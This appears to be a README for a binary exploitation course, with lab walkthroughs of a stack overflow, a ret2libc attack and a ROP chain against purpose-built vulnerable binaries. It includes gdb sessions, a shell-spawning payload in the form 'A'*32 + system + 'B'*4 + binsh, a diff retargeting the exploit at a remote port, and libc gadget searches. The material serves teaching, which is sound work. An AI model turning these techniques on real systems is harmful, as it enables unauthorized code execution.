Binary Exploitation Tutorial
============================

Examples
--------

### GDB

* Path: `gdb/`
* Goal: perform an overflow to set the value of the `authenticated` variable to `1337` and make the application print the success message.

You can play the recording of the session by typing

	asciinema play gdb_example.cast

The video is also available [on-line](https://asciinema.org/a/oqIa5fgeeQWGiP9zyBQSisX6e).

### Ret2Libc

* Path: `ret2libc/`
* Goal: use a re2libc attack to call `system("/bin/sh")` by exploiting the overflow vulnerability in the `echo` function.

Find the address of the string "binsh":

	$ objdump -D ropme | grep binsh
	0804a020 <binsh>:

Find the address of system():

	$ gdb ropme
	(gdb) b main
	Breakpoint 1 at 0x80484b5
	(gdb) r
	Starting program: /home/marco/rop/ropme

	Breakpoint 1, 0x080484b5 in main ()
	(gdb) p system
	$1 = {<text variable, no debug info>} 0x2a8d3200 <system>

Now we must find the lenght of our payload and where to place the return address of the next function to call (system) and the parameter


	(gdb) b *0x08048486
	Breakpoint 2 at 0x8048486
	(gdb) c
	Continuing.
	AAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAA

	Breakpoint 2, 0x08048486 in echo ()

	(gdb) x/40wx $esp
	0xffffd650:     0x2aa6e000      0x2aa6e000      0x00000000      0x41414141
	0xffffd660:     0x41414141      0x41414141      0x41414141      0x08048500
	0xffffd670:     0x00000001      0x00000000      0xffffd688      0x080484ac
	0xffffd680:     0x2aa929b0      0xffffd6a0      0x00000000      0x2a8aee81
	0xffffd690:     0x2aa6e000      0x2aa6e000      0x00000000      0x2a8aee81
	0xffffd6a0:     0x00000001      0xffffd734      0xffffd73c      0xffffd6c4
	0xffffd6b0:     0x00000001      0x00000000      0x2aa6e000      0x2aa9275a
	0xffffd6c0:     0x2aaaa000      0x00000000      0x2aa6e000      0x00000000
	0xffffd6d0:     0x00000000      0x3be2084a      0xd193cfe0      0x00000000
	0xffffd6e0:     0x00000000      0x00000000      0x00000001      0x08048340

	(gdb) info frame
	Stack level 0, frame at 0xffffd680:
	 eip = 0x8048486 in echo; saved eip = 0x80484ac
	 called by frame at 0xffffd6a0
	 Arglist at 0xffffd678, args:
	 Locals at 0xffffd678, Previous frame's sp is 0xffffd680
	 Saved registers:
	  ebx at 0xffffd674, ebp at 0xffffd678, eip at 0xffffd67c

	(gdb) p 0xffffd67c - (0xffffd660 - 4)
	$2 = 32


We now build the payload, see `exploit.py`

	marco@testbed:~/rop$ ./exploit.py ./ropme
	[+] Starting local process './ropme': pid 22214
	[*] Switching to interactive mode
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	$ id
	uid=1502(marco) gid=1503(marco) groups=1503(marco)

Pwntools is very handy because it allows to interact with remote programs as if they were local ones just be changing a single line in the script.

	marco@testbed:~/rop$ git diff exploit.py exploit_r.py
	diff --git a/exploit.py b/exploit_r.py
	index 94ff3a5..1a7bc89 100755
	--- a/exploit.py
	+++ b/exploit_r.py
	@@ -7,7 +7,7 @@ def main():
	     binsh = p32(0x0804a020)
	     system = p32(0xf7e26200)

	-    p = process(sys.argv[1])
	+    p = remote('127.0.0.1', 31337)
	     p.sendline('A'*32 + system + 'B'*4 + binsh)
	     p.interactive()


### ROP

* Path: `rop/`
* Goal: build a rop-chain to change the value of the `guard` into `0xb000000f` and continue with the execution of the program to make it print the success message.

Our simple ROP example requires to write an arbitrary value on a variable that is out of the stack. First we need to get the base address of the library when it's loaded:

	$ cat /proc/24240/maps
	f7de9000-f7fbe000 r-xp 00000000 fc:01 1807762                            /lib/i386-linux-gnu/libc-2.27.so

So our base address is f7de9000.

Now we look for a gadget that allows to write the content of a register into the address pointed by another register, like a `mov dword ptr [edx], eax`:

	$ ROPgadget --binary  /lib/i386-linux-gnu/libc-2.27.so > libcgadgets.txt
	$ grep -E 'mov dword ptr \[e.x\], e.x' libcgadgets.txt
	...
	0x00075425 : mov dword ptr [edx], eax ; ret
	...

Now we need to set something into these two registers, so we'd like to have some pops:

	0x00001aae : pop edx ; ret
	0x00024b5e : pop eax ; ret

And we should also figure out where our variable `guard` is:

	marco@testbed:~/rop_w$ objdump -D ropmew | grep guard
	0804a020 <guard>

And where the function should return:

	   0x08048498 <+26>:    call   0x8048456 <readstuff>
	   0x0804849d <+31>:    mov    eax,DWORD PTR [ebx+0x20]

One last step... the application expects to fetch the content of the `guard` from `ebx+0x20`. After the attack, we might have changed the value of `ebx`, so we must leverage another gadget to reset its value to the intended one. If we don't do this, the application might try to access an unreadable area of memory

	=> 0x0804849d <+31>:    mov    eax,DWORD PTR [ebx+0x20]
   	0x080484a3 <+37>:    cmp    eax,0xb000000f

As we can see, since `eax` should contain the value of the `guard`, the proper value of `ebx` must be the location of the guard - 0x20... the gadget we need is a `pop ebx; ret`:

	0x00018be5 : pop ebx ; ret

Now we write and execute the payload, see attack.py!

Tricks
------

### GDB

Provide some input systematically to the stdin of an application that is being debugged:

	(gdb) r < <(python -c 'print("A"*19)')
	(gdb) r <<< $(python -c 'print("A"*19)')

### Misc

Print the list of security features enabled for a certain binary

	$ checksec ./binary
